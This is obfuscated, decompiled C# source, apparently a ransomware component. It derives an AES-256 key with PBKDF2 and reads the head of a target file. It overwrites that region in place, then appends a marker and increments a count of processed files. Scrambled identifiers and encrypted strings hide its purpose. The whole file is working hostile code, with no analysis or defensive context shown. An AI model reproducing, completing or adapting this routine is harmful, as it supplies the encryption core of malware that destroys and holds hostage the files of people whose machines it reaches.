using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace InTDhhOfzy;

public static class qiylEdmqkDK
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] eqCXDeuOFzjErU(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = oPbIuReYAPsK(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes oPbIuReYAPsK(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] VfCZQwfOAj(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (atvFwvQCkKwzkN.YCyjCQiwEiQ == getString_0(107396882))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (atvFwvQCkKwzkN.ySPgVCqYcWT)
			{
				try
				{
					File.AppendAllText(atvFwvQCkKwzkN.NarcQCMbbNaqtU, getString_0(107393090) + string_0 + getString_0(107408442) + ex.Message + getString_0(107396708));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void XLEQJcZPEMiXzygqu(string idTFLyQZiFgNR, byte[] FgaDtOZgltTEf, byte[] eCvmaKFbLrK = null)
	{
		try
		{
			byte[] array = null;
			if (atvFwvQCkKwzkN.YCyjCQiwEiQ == getString_0(107396882))
			{
				array = (atvFwvQCkKwzkN.nXPdGXfAViu ? Encoding.ASCII.GetBytes(atvFwvQCkKwzkN.iWzroveCagNOUOgR(atvFwvQCkKwzkN.bNoLNbcKQsXj) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408352)) + Convert.ToString(atvFwvQCkKwzkN.IaLlphSuwiBhw) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408352))) : Encoding.ASCII.GetBytes(atvFwvQCkKwzkN.iWzroveCagNOUOgR(atvFwvQCkKwzkN.bNoLNbcKQsXj) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408361)) + Convert.ToString(atvFwvQCkKwzkN.IaLlphSuwiBhw) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408361))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(idTFLyQZiFgNR, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(FgaDtOZgltTEf, 0, FgaDtOZgltTEf.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(idTFLyQZiFgNR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!atvFwvQCkKwzkN.nXPdGXfAViu)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(eCvmaKFbLrK, 0, eCvmaKFbLrK.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (atvFwvQCkKwzkN.nXPdGXfAViu ? Encoding.ASCII.GetBytes(atvFwvQCkKwzkN.iWzroveCagNOUOgR(atvFwvQCkKwzkN.bNoLNbcKQsXj) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408352)) + Convert.ToString(atvFwvQCkKwzkN.IaLlphSuwiBhw) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408352))) : Encoding.ASCII.GetBytes(atvFwvQCkKwzkN.iWzroveCagNOUOgR(atvFwvQCkKwzkN.bNoLNbcKQsXj) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408361)) + Convert.ToString(atvFwvQCkKwzkN.IaLlphSuwiBhw) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408361))));
				FileStream fileStream2 = new FileStream(idTFLyQZiFgNR, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(FgaDtOZgltTEf, 0, FgaDtOZgltTEf.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(idTFLyQZiFgNR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!atvFwvQCkKwzkN.nXPdGXfAViu)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(eCvmaKFbLrK, 0, eCvmaKFbLrK.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			atvFwvQCkKwzkN.ePwuTuiAXFH++;
		}
		catch (Exception ex)
		{
			if (atvFwvQCkKwzkN.ySPgVCqYcWT)
			{
				try
				{
					File.AppendAllText(atvFwvQCkKwzkN.NarcQCMbbNaqtU, getString_0(107393090) + idTFLyQZiFgNR + getString_0(107408375) + ex.Message + getString_0(107396708));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (atvFwvQCkKwzkN.nXPdGXfAViu ? Encoding.ASCII.GetBytes(atvFwvQCkKwzkN.iWzroveCagNOUOgR(atvFwvQCkKwzkN.bNoLNbcKQsXj) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408352)) + Convert.ToString(atvFwvQCkKwzkN.IaLlphSuwiBhw) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408352))) : Encoding.ASCII.GetBytes(atvFwvQCkKwzkN.iWzroveCagNOUOgR(atvFwvQCkKwzkN.bNoLNbcKQsXj) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408361)) + Convert.ToString(atvFwvQCkKwzkN.IaLlphSuwiBhw) + atvFwvQCkKwzkN.iWzroveCagNOUOgR(getString_0(107408361))));
			FileStream fileStream4 = new FileStream(idTFLyQZiFgNR, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(FgaDtOZgltTEf, 0, FgaDtOZgltTEf.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(idTFLyQZiFgNR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!atvFwvQCkKwzkN.nXPdGXfAViu)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(eCvmaKFbLrK, 0, eCvmaKFbLrK.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static qiylEdmqkDK()
	{
		Strings.CreateGetStringDelegate(typeof(qiylEdmqkDK));
	}
}
